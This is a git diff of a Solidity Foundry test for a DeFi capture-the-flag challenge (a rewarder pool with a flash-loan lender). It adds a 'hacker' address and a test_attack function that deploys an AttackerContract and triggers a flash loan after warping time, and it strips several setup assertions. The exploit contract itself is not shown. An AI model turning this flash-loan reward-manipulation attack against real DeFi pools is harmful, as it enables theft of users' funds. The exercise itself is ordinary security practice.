@@ -7,6 +7,7 @@ import {DamnValuableToken} from "../src/DamnValuableToken.sol";
 import {FlashLoanerPool} from "../src/FlashLoanerPool.sol";
 import {RewardToken} from "../src/RewardToken.sol";
 import {TheRewarderPool} from "../src/TheRewarderPool.sol";
+import {AttackerContract} from "../src/AttackerContract.sol";
 
 contract SideEntranceLenderTest is Test {
 
@@ -15,12 +16,15 @@ contract SideEntranceLenderTest is Test {
     FlashLoanerPool flashLoanerPool;  //deployed
     RewardToken rewardToken;
     TheRewarderPool rewarderPool;
+    AttackerContract attackerContract;
 
     address admin = makeAddr("admin");
     address alice = makeAddr("alice");
     address bob = makeAddr("bob");
     address charlie = makeAddr("charlie");
     address david = makeAddr("david");
+
+    address hacker = makeAddr("hacker");
 
     address[] users = [alice, bob, charlie, david];
 
@@ -31,7 +35,7 @@ contract SideEntranceLenderTest is Test {
     function setUp() external {
         vm.startPrank(admin);
         dvt = new DamnValuableToken();
-        flashLoanerPool = new FlashLoanerPool(address(accountingToken));
+        flashLoanerPool = new FlashLoanerPool(address(dvt));
         dvt.transfer(address(flashLoanerPool), TOKENS_IN_LENDER_POOL);
 
         rewarderPool = new TheRewarderPool(address(accountingToken));
@@ -39,14 +43,6 @@ contract SideEntranceLenderTest is Test {
         rewardToken = RewardToken(rewardTokenAddress);
         address accountingTokenAddress = rewarderPool.accountingToken.address;
         accountingToken = AccountingToken(accountingTokenAddress);
-
-        assertEq(accountingToken.owner(), address(rewarderPool));
-        bool accountingTokenInfoResult = accountingToken.hasAllRoles(address(rewarderPool), accountingToken.MINTER_ROLE() | accountingToken.SNAPSHOT_ROLE() | accountingToken.BURNER_ROLE());
-        assertTrue(accountingTokenInfoResult);
-
-        assertEq(rewardToken.owner(), address(rewarderPool));
-        bool rewardTokenInfoResult = rewardToken.hasAllRoles(address(rewarderPool), rewardToken.MINTER_ROLE());
-        assertTrue(rewardTokenInfoResult);
         vm.stopPrank();
 
         for(uint i = 0; i < users.length; i++){
@@ -59,13 +55,18 @@ contract SideEntranceLenderTest is Test {
             vm.stopPrank();
         }
 
-        assertEq(accountingToken.totalSupply(), users.length * USER_DEPOSIT_AMOUNT);
-        assertEq(rewardToken.totalSupply(), 0);
+    }
 
+    function test_attack() public {
+        // console.log(block.number);
+        vm.warp(433000);
+        vm.roll(block.number + 1);
+        // console.log(block.number);
+        vm.startPrank(hacker);
+        attackerContract = new AttackerContract(address(flashLoanerPool), address(dvt), address(rewarderPool));
+        attackerContract.flashLoan(100e18);
+        uint256 test = accountingToken.balanceOf(address(attackerContract));
 
-        ///cosnoel log block.timestamp
-        //wrap
-        //then log the timestam9p again
     }
 
 }
